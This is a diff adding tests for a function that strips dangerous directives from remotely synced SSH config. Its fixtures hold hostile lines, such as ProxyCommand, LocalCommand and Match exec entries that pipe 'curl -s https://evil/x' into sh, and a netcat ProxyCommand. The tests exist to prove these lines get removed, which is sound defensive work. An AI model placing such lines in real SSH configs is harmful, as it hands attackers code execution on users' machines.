@@ -4,6 +4,7 @@ import {
   writeManagedSshConfigBlock,
   mergeSshConfigBlocks,
   mergeKnownHosts,
+  sanitizeSshConfigBody,
 } from '../../src/main/services/SshNativeFileMerger';
 
 describe('SshNativeFileMerger — ssh config managed block', () => {
@@ -50,6 +51,53 @@ describe('SshNativeFileMerger — ssh config managed block', () => {
     expect(updated).toContain('Host another');
     expect(updated).toContain('Host new');
     expect(updated).not.toContain('Host old');
+  });
+
+  it('sanitizeSshConfigBody strips ProxyCommand/LocalCommand/PermitLocalCommand/RemoteCommand/Match/Include directives', () => {
+    const body = [
+      'Host evil',
+      '  HostName evil.example.com',
+      '  ProxyCommand curl -s https://evil/x | sh',
+      '  PermitLocalCommand yes',
+      '  LocalCommand curl -s https://evil/y | sh',
+      '  RemoteCommand touch /tmp/pwned',
+      'Match exec "curl -s https://evil/z | sh"',
+      'Include /tmp/evil-include.conf',
+      '  User admin',
+    ].join('\n');
+
+    const { body: sanitized, removedLines } = sanitizeSshConfigBody(body);
+
+    expect(sanitized).toContain('Host evil');
+    expect(sanitized).toContain('HostName evil.example.com');
+    expect(sanitized).toContain('User admin');
+    expect(sanitized).not.toMatch(/ProxyCommand/i);
+    expect(sanitized).not.toMatch(/LocalCommand/i);
+    expect(sanitized).not.toMatch(/RemoteCommand/i);
+    expect(sanitized).not.toMatch(/^Match/im);
+    expect(sanitized).not.toMatch(/Include/i);
+    expect(removedLines.length).toBe(6);
+  });
+
+  it('is case-insensitive and handles "Key=Value" syntax for blocked directives', () => {
+    const { sanitized, removed } = (() => {
+      const r = sanitizeSshConfigBody('Host x\n  proxycommand=nc %h %p\n  HostName x.example.com');
+      return { sanitized: r.body, removed: r.removedLines };
+    })();
+    expect(sanitized).not.toMatch(/proxycommand/i);
+    expect(sanitized).toContain('HostName x.example.com');
+    expect(removed.length).toBe(1);
+  });
+
+  it('writeManagedSshConfigBlock never writes a blocked directive synced from remote', () => {
+    const maliciousBody = 'Host *\n  ProxyCommand curl -s https://evil/x | sh\n  User admin';
+    const result = writeManagedSshConfigBlock('', { updatedAt: '2026-01-01T00:00:00.000Z', body: maliciousBody });
+
+    expect(result).not.toMatch(/ProxyCommand/i);
+    expect(result).toContain('User admin');
+
+    const parsed = parseManagedSshConfigBlock(result);
+    expect(parsed?.body).not.toMatch(/ProxyCommand/i);
   });
 
   it('merge: remote block wins when it is newer', () => {
